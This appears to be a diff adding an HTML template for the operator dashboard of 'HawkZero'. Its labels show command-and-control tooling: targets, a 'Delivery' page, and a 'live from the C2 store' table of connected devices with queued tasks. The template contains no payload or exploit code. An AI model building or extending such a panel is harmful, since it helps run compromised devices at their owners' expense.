@@ -1,0 +1,68 @@
+{% include 'partials/head.html' %}
+<div class="shell">
+  {% include 'partials/sidebar.html' %}
+
+  <main class="main hz-cyan">
+    <div class="topbar">
+      <div class="crumbs">HawkZero / <b>Dashboard</b></div>
+      <div class="hz-btn-group">
+        <span class="muted" style="letter-spacing:.1em">Operator: <b>{{ user }}</b></span>
+        <a class="hz-btn hz-btn--sm hz-cyan" href="/admin">Refresh</a>
+        <form method="post" action="/logout" style="display:inline">
+          <button class="hz-btn hz-btn--sm hz-btn--ghost hz-btn--danger" type="submit">Sign out</button>
+        </form>
+      </div>
+    </div>
+
+    <h1 style="margin-bottom:18px">Dashboard</h1>
+
+    <section class="panel">
+      <header><h2>System status</h2>
+        <div class="hz-btn-group">
+          <a class="hz-btn hz-btn--sm hz-gold" href="/admin/targets">Targets</a>
+          <a class="hz-btn hz-btn--sm hz-btn--ghost hz-violet" href="/landing" target="_blank">Delivery</a>
+        </div>
+      </header>
+      <div class="stats">
+        <div class="stat"><b>{{ stats.devices }}</b><span>Devices</span></div>
+        <div class="stat"><b>{{ stats.online }}</b><span>Online</span></div>
+        <div class="stat"><b>{{ stats.tasks }}</b><span>Tasks done</span></div>
+        <div class="stat"><b>{{ stats.results }}</b><span>Results</span></div>
+      </div>
+    </section>
+
+    <section class="panel">
+      <header><h2>Sectors</h2></header>
+      <div class="sector-links">
+        {% for s in sections if s.slug != 'dashboard' %}
+          <a class="hz-btn hz-btn--sm hz-{{ s.theme }}" href="/admin/{{ s.slug }}">{{ s.label }}</a>
+        {% endfor %}
+      </div>
+    </section>
+
+    <section class="panel">
+      <header><h2>Connected devices</h2>
+        <div class="hz-btn-group">
+          <span class="muted" style="font-size:.8rem">live from the C2 store</span>
+        </div>
+      </header>
+      <table class="hz">
+        <thead><tr><th>Device</th><th>Model</th><th>Build</th><th>Queued</th><th>Last seen</th></tr></thead>
+        <tbody>
+        {% for a in agents %}
+          <tr>
+            <td>{{ a.id }}</td>
+            <td>{{ a.info.model or '?' if a.info else '?' }}</td>
+            <td>{{ a.info.build or '?' if a.info else '?' }}</td>
+            <td>{{ a.queued }}</td>
+            <td>{{ a.seen }}</td>
+          </tr>
+        {% else %}
+          <tr><td colspan="5" class="muted">No devices connected yet.</td></tr>
+        {% endfor %}
+        </tbody>
+      </table>
+    </section>
+  </main>
+</div>
+{% include 'partials/foot.html' %}
